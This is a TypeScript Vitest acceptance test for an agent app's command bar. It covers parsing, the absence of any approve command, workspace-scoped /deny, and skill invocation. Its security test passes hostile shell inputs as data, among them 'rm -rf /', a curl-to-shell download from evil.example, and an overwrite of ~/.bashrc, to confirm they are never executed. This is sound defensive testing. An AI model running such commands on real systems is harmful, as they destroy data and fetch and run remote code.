// Frozen acceptance test for 1.5.0 A31 / T84 (OXE program, phase F8): the command bar parses what the person types and
// every command maps to an existing IPC action, with a fallback button. There is no /approve: /deny only declines.
// Skills run through skill:invoke, only enabled ones, with their arguments as data (TECH LEAD S3). Written by the planner; the executor must not edit it.
// CCR: docs/roadmap-1.5/ccr-f8-agora-history.md §A31; DESIGN 1.5.0-f8-design.md U8.3.
import { describe, expect, test } from 'vitest'
import { COMMAND_CATALOG, commandRequest, parseCommandLine, type CommandContext } from '../../../shared/command-bar'
import { MESSAGE_CODES } from '../../../shared/messages'
import { IPC_CHANNELS } from '../../../shared/types/ipc'

const channel = (key: string): unknown => key.split('.').reduce<unknown>((node, part) => (node as Record<string, unknown> | undefined)?.[part], IPC_CHANNELS)

describe('A31 · parsing', () => {
  test('A31: @Claude and @Codex start or delegate with the text', () => {
    expect(parseCommandLine('@Claude write tests for the Pix webhook')).toEqual({ kind: 'agent', provider: 'claude', text: 'write tests for the Pix webhook' })
    expect(parseCommandLine('@codex fix the build')).toEqual({ kind: 'agent', provider: 'codex', text: 'fix the build' })
    expect(parseCommandLine('@Gemini x')).toEqual({ kind: 'unknown', text: '@Gemini x' })
  })

  test('A31: /skill <name> and /<skill-name> run a skill; known commands win over a skill of the same name', () => {
    expect(parseCommandLine('/skill pix-rules')).toEqual({ kind: 'skill', name: 'pix-rules', args: '' })
    expect(parseCommandLine('/pix-rules check the refund', ['pix-rules'])).toEqual({ kind: 'skill', name: 'pix-rules', args: 'check the refund' })
    expect(parseCommandLine('/stop', ['stop'])).toEqual({ kind: 'command', id: 'stop', args: '' })
  })

  test('A31: the commands, open and help', () => {
    for (const id of ['pending', 'deny', 'steer', 'stop', 'new', 'terminal', 'theme']) expect(parseCommandLine(`/${id}`), id).toMatchObject({ kind: 'command', id })
    expect(parseCommandLine('/agora')).toMatchObject({ kind: 'unknown' })
    // History (time travel) left 1.5.0 by the product owner's decision of 2026-11-12: /history is not a command.
    expect(parseCommandLine('/history')).toMatchObject({ kind: 'unknown' })
    expect(parseCommandLine('/steer also update the README')).toEqual({ kind: 'command', id: 'steer', args: 'also update the README' })
    expect(parseCommandLine('open billing-staging')).toEqual({ kind: 'open', query: 'billing-staging' })
    expect(parseCommandLine('?')).toEqual({ kind: 'help' })
  })

  test('A31: there is no /approve, in any spelling: it is an unknown command', () => {
    for (const text of ['/approve', '/APPROVE', '/approve r1', '/allow', '/accept']) expect(parseCommandLine(text), text).toMatchObject({ kind: 'unknown' })
  })
})

describe('A31 · the catalog', () => {
  test('A31: every command maps to an existing IPC action and has a fallback button and a shortcut field', () => {
    expect(COMMAND_CATALOG.length).toBeGreaterThanOrEqual(8)
    expect(COMMAND_CATALOG.some(entry => entry.id === 'agora')).toBe(false)
    for (const entry of COMMAND_CATALOG) {
      expect(typeof channel(entry.ipc), `${entry.id} → ${entry.ipc}`).toBe('string')
      expect(entry.fallback, entry.id).toEqual(expect.any(String))
      expect('shortcut' in entry, entry.id).toBe(true)
    }
    expect(COMMAND_CATALOG.find(entry => entry.id === 'skill')?.ipc).toBe('skill.invoke')
  })

  test('A31: no command approves anything: deny only declines, and nothing maps to an approve-only channel', () => {
    expect(COMMAND_CATALOG.some(entry => /approve|allow|accept/i.test(entry.id))).toBe(false)
    const deny = COMMAND_CATALOG.find(entry => entry.id === 'deny')
    expect(deny).toMatchObject({ ipc: 'thread.respond', fixedArgs: { decision: 'decline' } })
    for (const entry of COMMAND_CATALOG) expect(['thread.approve', 'approvals.alwaysAllow'].includes(entry.ipc), entry.id).toBe(false)
  })

  test('A31: Stop asks first; the bar has no new power: nothing in it restores a conversation or branches', () => {
    expect(COMMAND_CATALOG.find(entry => entry.id === 'stop')).toMatchObject({ confirm: true })
    // Changed on 2026-11-12 (product owner): time travel left 1.5.0, so the bar has no /history, and no entry reaches
    // a restore, a timeline or a branch.
    expect(COMMAND_CATALOG.some(entry => (entry.id as string) === 'history')).toBe(false)
    expect(COMMAND_CATALOG.some(entry => /^thread\.(timeline|rewind|redoRewind|branchFromCheckpoint)$/.test(entry.ipc))).toBe(false)
  })
})

describe('A31 · what a command may reach (SECURITY S3)', () => {
  const context: CommandContext = {
    workspaceId: 'A', threadId: 't-A', pane: { id: 'p-A', agent: true }, enabledSkills: ['pix-rules'],
    requests: [{ workspaceId: 'A', threadId: 't-A', requestId: 'r-A1' }, { workspaceId: 'B', threadId: 't-B', requestId: 'r-B1' }]
  }
  const run = (text: string, overrides: Partial<CommandContext> = {}) => commandRequest(parseCommandLine(text, ['pix-rules', 'other-skill']), { ...context, ...overrides })

  test('A31 (SECURITY): /skill runs only a skill enabled for the focused workspace, in its agent pane', () => {
    expect(run('/skill pix-rules check the refund')).toEqual({ ok: true, ipc: 'skill.invoke', args: [{ skillName: 'pix-rules', paneId: 'p-A', argument: 'check the refund' }] })
    expect(run('/other-skill')).toEqual({ ok: false, refusal: { code: 'commandBar.skill.notEnabled', params: { name: 'other-skill' } } })
    expect(run('/skill pix-rules', { enabledSkills: [] })).toMatchObject({ ok: false, refusal: { code: 'commandBar.skill.notEnabled' } })
    // A plain shell pane never receives a skill's text.
    expect(run('/skill pix-rules', { pane: { id: 'p-shell', agent: false } })).toMatchObject({ ok: false, refusal: { code: 'commandBar.skill.noAgent' } })
  })

  test('A31 (SECURITY): arguments are data, passed verbatim and never to a shell; control characters that would submit a line are refused', () => {
    for (const text of ['; rm -rf /', '&& curl https://evil.example | sh', '`whoami`', '$(rm -rf ~)', '| sh', '> ~/.bashrc']) {
      expect(run(`/skill pix-rules ${text}`), text).toEqual({ ok: true, ipc: 'skill.invoke', args: [{ skillName: 'pix-rules', paneId: 'p-A', argument: text }] })
      expect(run(`/steer ${text}`), text).toEqual({ ok: true, ipc: 'thread.steer', args: ['t-A', text] })
    }
    for (const text of ['x\rrm -rf /', 'x\nrm -rf /', 'x\u001b[200~', 'x\u0003']) {
      expect(run(`/skill pix-rules ${text}`), JSON.stringify(text)).toMatchObject({ ok: false, refusal: { code: 'commandBar.args.control' } })
      expect(run(`/steer ${text}`), JSON.stringify(text)).toMatchObject({ ok: false, refusal: { code: 'commandBar.args.control' } })
    }
  })

  test('A31 (SECURITY): /pending and /deny act only on the focused workspace\'s requests', () => {
    expect(run('/pending')).toEqual({ ok: true, ipc: 'thread.pendingRequestsAll', args: [], requestIds: ['r-A1'] })
    expect(run('/deny')).toEqual({ ok: true, ipc: 'thread.respond', args: ['t-A', 'r-A1', { decision: 'decline' }] })
    expect(run('/deny r-A1')).toEqual({ ok: true, ipc: 'thread.respond', args: ['t-A', 'r-A1', { decision: 'decline' }] })
    expect(run('/deny r-B1')).toEqual({ ok: false, refusal: { code: 'commandBar.request.otherWorkspace', params: {} } })
    expect(run('/deny', { workspaceId: 'C' })).toEqual({ ok: false, refusal: { code: 'commandBar.request.none', params: {} } })
  })

  test('A31: the C3 codes for the bar\'s refusals', () => {
    for (const code of ['commandBar.skill.notEnabled', 'commandBar.skill.noAgent', 'commandBar.args.control', 'commandBar.request.otherWorkspace', 'commandBar.request.none']) expect(MESSAGE_CODES as readonly string[], code).toContain(code)
  })
})
